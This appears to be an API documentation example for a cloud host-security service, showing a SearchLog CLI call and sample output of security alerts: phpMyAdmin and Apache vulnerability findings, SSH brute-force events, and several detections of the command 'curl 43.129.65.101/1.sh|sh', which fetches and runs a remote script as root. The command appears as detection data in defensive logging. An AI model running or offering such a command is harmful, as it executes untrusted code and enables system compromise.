**Example 1: 示例**



Input: 

```
tccli cwp SearchLog --cli-unfold-argument  \
    --Sort desc \
    --Count 20 \
    --QueryString  \
    --StartTime 1656641065449 \
    --EndTime 1656641965449
```

Output: 
```
{
    "Response": {
        "Analysis": false,
        "Context": "",
        "Count": 17,
        "Data": [
            {
                "Content": "{\"create_time\":\"2022-07-01 10:00:27 +0800 CST\",\"hostip\":\"10.0.0.6\",\"level\":\"中危\",\"modify_time\":\"2022-07-01 10:17:05 +0800 CST\",\"remark\":\"\",\"uuid\":\"13bb1e16-9a7a-434d-9686-4328f72c97d7\",\"is_emergency\":\"False\",\"reference\":\"https://www.phpmyadmin.net/security/PMASA-2016-20/\",\"path\":\"/var/www/html/phpmyadmin\",\"fix\":\"1、建议升级到官方最新版本，官网地址：https://www.phpmyadmin.net\",\"cve_id\":\"CVE-2016-5704\",\"cls_event_type\":\"Web-CMS_vul\",\"appid\":\"1256299843\",\"name\":\"phpMyAdmin 4.6.x 表结构页面存在XSS漏洞\",\"id\":\"771\",\"vul_category\":\"Web-CMS漏洞\",\"descript\":\"漏洞文件路径: /var/www/html/phpmyadmin/templates/table/structure/display_table_stats.phtml\",\"event_status\":\"modify\",\"status\":\"待处理\"}",
                "FileName": "",
                "Source": "30.46.128.22",
                "TimeStamp": 1656641946000
            },
            {
                "Content": "{\"create_time\":\"2022-07-01 10:00:27 +0800 CST\",\"hostip\":\"10.0.0.6\",\"level\":\"高危\",\"modify_time\":\"2022-07-01 10:17:05 +0800 CST\",\"remark\":\"\",\"uuid\":\"13bb1e16-9a7a-434d-9686-4328f72c97d7\",\"is_emergency\":\"False\",\"reference\":\"https://httpd.apache.org/security/vulnerabilities_24.html\",\"path\":\"\",\"fix\":\"升级至2.4.6-90及以上版本或 2.4.39及以上版本\",\"cve_id\":\"CVE-2019-0217\",\"cls_event_type\":\"application_vul\",\"appid\":\"1256299843\",\"name\":\"Apache HTTP Server mod_auth_digest 条件竞争漏洞\",\"id\":\"767\",\"vul_category\":\"应用漏洞\",\"descript\":\"Apache HTTP Server 启用了 mod_auth_digest 模块，且Apache HTTP Server 版本为：2.4.37-47.module_el8.6.0+1111+ce6f4ceb.1。\",\"event_status\":\"modify\",\"status\":\"待处理\"}",
                "FileName": "",
                "Source": "30.46.128.22",
                "TimeStamp": 1656641946000
            },
            {
                "Content": "{\"create_time\":\"2022-07-01 10:00:27 +0800 CST\",\"hostip\":\"10.0.0.6\",\"level\":\"中危\",\"modify_time\":\"2022-07-01 10:17:05 +0800 CST\",\"remark\":\"\",\"uuid\":\"13bb1e16-9a7a-434d-9686-4328f72c97d7\",\"is_emergency\":\"True\",\"reference\":\"https://www.phpmyadmin.net/security/PMASA-2016-19/\",\"path\":\"/var/www/html/phpmyadmin\",\"fix\":\"1、建议升级到官方最新版本，官网地址：https://www.phpmyadmin.net\",\"cve_id\":\"CVE-2016-5703\",\"cls_event_type\":\"emergency_vul\",\"appid\":\"1256299843\",\"name\":\"phpMyAdmin central_columns.lib.php  SQL注入漏洞\",\"id\":\"772\",\"vul_category\":\"Web-CMS漏洞\",\"descript\":\"漏洞文件路径: /var/www/html/phpmyadmin/libraries/central_columns.lib.php\",\"event_status\":\"modify\",\"status\":\"待处理\"}",
                "FileName": "",
                "Source": "30.46.128.22",
                "TimeStamp": 1656641946000
            },
            {
                "Content": "{\"create_time\":\"2022-07-01 10:00:27 +0800 CST\",\"hostip\":\"10.0.0.6\",\"level\":\"高危\",\"modify_time\":\"2022-07-01 10:17:05 +0800 CST\",\"remark\":\"\",\"uuid\":\"13bb1e16-9a7a-434d-9686-4328f72c97d7\",\"is_emergency\":\"False\",\"reference\":\"https://www.seebug.org/vuldb/ssvid-92512\",\"path\":\"/var/www/html/phpmyadmin\",\"fix\":\"1、升级到最新版本，官网地址：https://www.phpmyadmin.net\",\"cve_id\":\"CVE-2016-6633\",\"cls_event_type\":\"Web-CMS_vul\",\"appid\":\"1256299843\",\"name\":\"phpMyAdmin dbase extension 远程代码执行漏洞\",\"id\":\"764\",\"vul_category\":\"Web-CMS漏洞\",\"descript\":\"漏洞文件路径: /var/www/html/phpmyadmin/libraries/zip_extension.lib.php\",\"event_status\":\"modify\",\"status\":\"待处理\"}",
                "FileName": "",
                "Source": "30.46.128.22",
                "TimeStamp": 1656641946000
            },
            {
                "Content": "{\"create_time\":\"2022-07-01 10:00:27 +0800 CST\",\"hostip\":\"10.0.0.6\",\"level\":\"中危\",\"modify_time\":\"2022-07-01 10:17:05 +0800 CST\",\"remark\":\"\",\"uuid\":\"13bb1e16-9a7a-434d-9686-4328f72c97d7\",\"is_emergency\":\"False\",\"reference\":\"https://httpd.apache.org/security/vulnerabilities_24.html#CVE-2020-9490\",\"path\":\"\",\"fix\":\"升级 Apache HTTP Server到 2.4.46 版本\",\"cve_id\":\"CVE-2020-9490\",\"cls_event_type\":\"application_vul\",\"appid\":\"1256299843\",\"name\":\"Apache HTTP Server http2_module 拒绝服务漏洞\",\"id\":\"769\",\"vul_category\":\"应用漏洞\",\"descript\":\"Apache HTTP Server 启用了 mod_http2 模块，且Apache HTTP Server版本为：2.4.37-47.module_el8.6.0+1111+ce6f4ceb.1。\",\"event_status\":\"modify\",\"status\":\"待处理\"}",
                "FileName": "",
                "Source": "30.46.128.22",
                "TimeStamp": 1656641946000
            },
            {
                "Content": "{\"create_time\":\"2022-07-01 10:00:27 +0800 CST\",\"hostip\":\"10.0.0.6\",\"level\":\"高危\",\"modify_time\":\"2022-07-01 10:17:05 +0800 CST\",\"remark\":\"\",\"uuid\":\"13bb1e16-9a7a-434d-9686-4328f72c97d7\",\"is_emergency\":\"True\",\"reference\":\"https://www.seebug.org/vuldb/ssvid-92209\",\"path\":\"/var/www/html/phpmyadmin\",\"fix\":\"1、建议升级至官方最新版本并且避免使用弱密码；\",\"cve_id\":\"CVE-2016-5734\",\"cls_event_type\":\"emergency_vul\",\"appid\":\"1256299843\",\"name\":\"phpMyAdmin授权用户远程命令执行漏洞\",\"id\":\"768\",\"vul_category\":\"Web-CMS漏洞\",\"descript\":\"漏洞文件路径: /var/www/html/phpmyadmin/libraries/controllers/table/TableSearchController.php\",\"event_status\":\"modify\",\"status\":\"待处理\"}",
                "FileName": "",
                "Source": "30.46.128.22",
                "TimeStamp": 1656641946000
            },
            {
                "Content": "{\"create_time\":\"2022-07-01 10:00:27 +0800 CST\",\"hostip\":\"10.0.0.6\",\"level\":\"高危\",\"modify_time\":\"2022-07-01 10:17:05 +0800 CST\",\"remark\":\"\",\"uuid\":\"13bb1e16-9a7a-434d-9686-4328f72c97d7\",\"is_emergency\":\"False\",\"reference\":\"https://www.phpmyadmin.net/security/PMASA-2016-40/\",\"path\":\"/var/www/html/phpmyadmin\",\"fix\":\"1、建议升级到官方最新版本，官网地址：https://www.phpmyadmin.net\",\"cve_id\":\"CVE-2016-6617\",\"cls_event_type\":\"Web-CMS_vul\",\"appid\":\"1256299843\",\"name\":\"phpMyAdmin 4.6.x 导出功能SQL注入漏洞\",\"id\":\"765\",\"vul_category\":\"Web-CMS漏洞\",\"descript\":\"漏洞文件路径: /var/www/html/phpmyadmin/libraries/display_export.lib.php\",\"event_status\":\"modify\",\"status\":\"待处理\"}",
                "FileName": "",
                "Source": "30.46.128.22",
                "TimeStamp": 1656641946000
            },
            {
                "Content": "{\"create_time\":\"2022-07-01 10:00:27 +0800 CST\",\"hostip\":\"10.0.0.6\",\"level\":\"高危\",\"modify_time\":\"2022-07-01 10:17:05 +0800 CST\",\"remark\":\"\",\"uuid\":\"13bb1e16-9a7a-434d-9686-4328f72c97d7\",\"is_emergency\":\"False\",\"reference\":\"https://www.phpmyadmin.net/security/PMASA-2016-25/\",\"path\":\"/var/www/html/phpmyadmin\",\"fix\":\"1、建议升级到官方最新版本，官网地址：https://www.phpmyadmin.net\",\"cve_id\":\"CVE-2016-5732\",\"cls_event_type\":\"Web-CMS_vul\",\"appid\":\"1256299843\",\"name\":\"phpMyAdmin 4.6.x XSS漏洞\",\"id\":\"770\",\"vul_category\":\"Web-CMS漏洞\",\"descript\":\"漏洞文件路径: /var/www/html/phpmyadmin/templates/table/structure/display_partitions.phtml\",\"event_status\":\"modify\",\"status\":\"待处理\"}",
                "FileName": "",
                "Source": "30.46.128.22",
                "TimeStamp": 1656641946000
            },
            {
                "Content": "{\"create_time\":\"2022-07-01 10:00:27 +0800 CST\",\"hostip\":\"10.0.0.6\",\"level\":\"中危\",\"modify_time\":\"2022-07-01 10:17:05 +0800 CST\",\"remark\":\"\",\"uuid\":\"13bb1e16-9a7a-434d-9686-4328f72c97d7\",\"is_emergency\":\"False\",\"reference\":\"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11984\",\"path\":\"\",\"fix\":\"升级至2.4.44及以上版本\",\"cve_id\":\"CVE-2020-11984\",\"cls_event_type\":\"application_vul\",\"appid\":\"1256299843\",\"name\":\"Apache HTTP Server mod_proxy_uwsgi 缓冲区溢出漏洞\",\"id\":\"766\",\"vul_category\":\"应用漏洞\",\"descript\":\"Apache HTTP Server 启用了 mod_proxy_uwsgi 模块，且版本为：2.4.37-47.module_el8.6.0+1111+ce6f4ceb.1。\",\"event_status\":\"modify\",\"status\":\"待处理\"}",
                "FileName": "",
                "Source": "30.46.128.22",
                "TimeStamp": 1656641946000
            },
            {
                "Content": "{\"create_time\":\"2022-06-30 11:01:55 +0800 CST\",\"hostip\":\"172.16.48.133\",\"modify_time\":\"2022-07-01 10:15:23 +0800 CST\",\"count\":\"3380\",\"uuid\":\"e1f081aa-7777-4fdf-a2f7-88f3faa3d302\",\"src_ip\":\"82.157.124.14\",\"src_machine_name\":\"ssh\",\"event_type\":\"暴破失败\",\"appid\":\"1256299843\",\"cls_event_type\":\"bruteattack\",\"dst_port\":\"22\",\"location\":\"北京-北京市\",\"banned\":\"未阻断(非专业版、非旗舰版)\",\"id\":\"202226000001705\",\"event_status\":\"modify\",\"status\":\"待处理\",\"username\":\"root\"}",
                "FileName": "",
                "Source": "30.46.128.22",
                "TimeStamp": 1656641844000
            },
            {
                "Content": "{\"create_time\":\"2022-06-30 11:01:55 +0800 CST\",\"hostip\":\"172.16.48.133\",\"modify_time\":\"2022-07-01 10:15:23 +0800 CST\",\"count\":\"3380\",\"uuid\":\"e1f081aa-7777-4fdf-a2f7-88f3faa3d302\",\"src_ip\":\"82.157.124.14\",\"src_machine_name\":\"ssh\",\"event_type\":\"暴破失败\",\"appid\":\"1256299843\",\"cls_event_type\":\"bruteattack\",\"dst_port\":\"22\",\"location\":\"北京-北京市\",\"banned\":\"未阻断(非专业版、非旗舰版)\",\"id\":\"202226000001705\",\"event_status\":\"modify\",\"status\":\"待处理\",\"username\":\"root\"}",
                "FileName": "",
                "Source": "30.46.128.22",
                "TimeStamp": 1656641824000
            },
            {
                "Content": "{\"create_time\":\"2022-07-01 10:10:03 +0800 CST\",\"hostip\":\"172.16.0.49\",\"rule_name\":\"1003.恶意命令-下载&执行未知程序\",\"modify_time\":\"0001-01-01 00:00:00 +0000 UTC\",\"rule_level\":\"高危\",\"uuid\":\"7168bc08-c1b8-11ea-9053-48fd8e5f474c\",\"platform\":\"Linux64\",\"appid\":\"1256299843\",\"cls_event_type\":\"bash\",\"exec_time\":\"2022-07-01 10:10:01 +0800 CST\",\"id\":\"3141559\",\"bash_cmd\":\"/bin/sh -c curl 43.129.65.101/1.sh|sh\",\"user\":\"0:0\",\"event_status\":\"create\",\"status\":\"待处理\"}",
                "FileName": "",
                "Source": "30.46.128.22",
                "TimeStamp": 1656641520000
            },
            {
                "Content": "{\"create_time\":\"2022-07-01 07:44:58 +0800 CST\",\"hostip\":\"172.16.48.79\",\"modify_time\":\"2022-07-01 10:09:23 +0800 CST\",\"count\":\"349\",\"uuid\":\"93137e79-ae2e-4677-95ac-23a5024607b1\",\"src_ip\":\"110.40.168.164\",\"src_machine_name\":\"ssh\",\"event_type\":\"暴破失败\",\"appid\":\"1256299843\",\"cls_event_type\":\"bruteattack\",\"dst_port\":\"22\",\"location\":\"上海-上海市\",\"banned\":\"未阻断(非专业版、非旗舰版)\",\"id\":\"202226000001999\",\"event_status\":\"modify\",\"status\":\"待处理\",\"username\":\"root\"}",
                "FileName": "",
                "Source": "30.46.128.22",
                "TimeStamp": 1656641484000
            },
            {
                "Content": "{\"create_time\":\"2022-07-01 07:44:58 +0800 CST\",\"hostip\":\"172.16.48.79\",\"modify_time\":\"2022-07-01 10:09:23 +0800 CST\",\"count\":\"349\",\"uuid\":\"93137e79-ae2e-4677-95ac-23a5024607b1\",\"src_ip\":\"110.40.168.164\",\"src_machine_name\":\"ssh\",\"event_type\":\"暴破失败\",\"appid\":\"1256299843\",\"cls_event_type\":\"bruteattack\",\"dst_port\":\"22\",\"location\":\"上海-上海市\",\"banned\":\"未阻断(非专业版、非旗舰版)\",\"id\":\"202226000001999\",\"event_status\":\"modify\",\"status\":\"待处理\",\"username\":\"root\"}",
                "FileName": "",
                "Source": "30.46.128.22",
                "TimeStamp": 1656641464000
            },
            {
                "Content": "{\"create_time\":\"2022-07-01 10:07:04 +0800 CST\",\"hostip\":\"172.16.0.49\",\"rule_name\":\"1003.恶意命令-下载&执行未知程序\",\"modify_time\":\"0001-01-01 00:00:00 +0000 UTC\",\"rule_level\":\"高危\",\"uuid\":\"7168bc08-c1b8-11ea-9053-48fd8e5f474c\",\"platform\":\"Linux64\",\"appid\":\"1256299843\",\"cls_event_type\":\"bash\",\"exec_time\":\"2022-07-01 10:07:01 +0800 CST\",\"id\":\"3141558\",\"bash_cmd\":\"/bin/sh -c curl 43.129.65.101/1.sh|sh\",\"user\":\"0:0\",\"event_status\":\"create\",\"status\":\"待处理\"}",
                "FileName": "",
                "Source": "30.46.128.22",
                "TimeStamp": 1656641280000
            },
            {
                "Content": "{\"create_time\":\"2022-07-01 10:05:04 +0800 CST\",\"hostip\":\"172.16.0.49\",\"rule_name\":\"1003.恶意命令-下载&执行未知程序\",\"modify_time\":\"0001-01-01 00:00:00 +0000 UTC\",\"rule_level\":\"高危\",\"uuid\":\"7168bc08-c1b8-11ea-9053-48fd8e5f474c\",\"platform\":\"Linux64\",\"appid\":\"1256299843\",\"cls_event_type\":\"bash\",\"exec_time\":\"2022-07-01 10:05:01 +0800 CST\",\"id\":\"3141557\",\"bash_cmd\":\"/bin/sh -c curl 43.129.65.101/1.sh|sh\",\"user\":\"0:0\",\"event_status\":\"create\",\"status\":\"待处理\"}",
                "FileName": "",
                "Source": "30.46.128.22",
                "TimeStamp": 1656641160000
            },
            {
                "Content": "{\"create_time\":\"2022-07-01 10:04:05 +0800 CST\",\"hostip\":\"172.16.0.49\",\"rule_name\":\"1003.恶意命令-下载&执行未知程序\",\"modify_time\":\"0001-01-01 00:00:00 +0000 UTC\",\"rule_level\":\"高危\",\"uuid\":\"7168bc08-c1b8-11ea-9053-48fd8e5f474c\",\"platform\":\"Linux64\",\"appid\":\"1256299843\",\"cls_event_type\":\"bash\",\"exec_time\":\"2022-07-01 10:04:01 +0800 CST\",\"id\":\"3141556\",\"bash_cmd\":\"/bin/sh -c curl 43.129.65.101/1.sh|sh\",\"user\":\"0:0\",\"event_status\":\"create\",\"status\":\"待处理\"}",
                "FileName": "",
                "Source": "30.46.128.22",
                "TimeStamp": 1656641160000
            }
        ],
        "ListOver": true,
        "RequestId": "e6bb2f6d-10b3-40fd-b3a4-630dbdf477c3"
    }
}
```

